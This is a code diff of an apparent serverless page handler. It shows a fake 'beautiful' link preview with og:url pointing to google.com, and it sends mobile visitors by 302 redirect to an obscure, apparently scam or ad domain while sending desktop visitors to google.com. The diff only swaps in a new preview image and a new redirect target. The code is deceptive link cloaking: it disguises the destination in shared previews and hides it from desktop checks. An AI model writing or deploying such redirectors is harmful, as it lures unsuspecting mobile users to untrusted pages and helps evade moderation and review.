@@ -14,7 +14,7 @@ export async function onRequest(context) {
     <title>Welcome</title>
     <meta property="og:title" content="🤍♥️beautiful♥️🤍">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://bqdfnmieggxkvodvrdxe.supabase.co/storage/v1/object/public/vvvvd/WhatsApp%20Image%202026-09-25%20at%202.26.16%20PM.gif">
+    <meta property="og:image" content="https://www.shutterstock.com/image-vector/minimalist-black-white-abstract-art-260nw-2629461235.jpg">
     <meta property="og:url" content="https://www.google.com">
     <meta property="og:type" content="website">
 </head>
@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://viral.reelsvideos.top/viral33bai/?utm_source=amsh&utm_medium=amsh2", 302);
+    return Response.redirect("https://bonnetdetectiveshomecoming.com/rqbamyp64c?key=866bc5ba1e525b6c9b55bb8d072f8b91", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
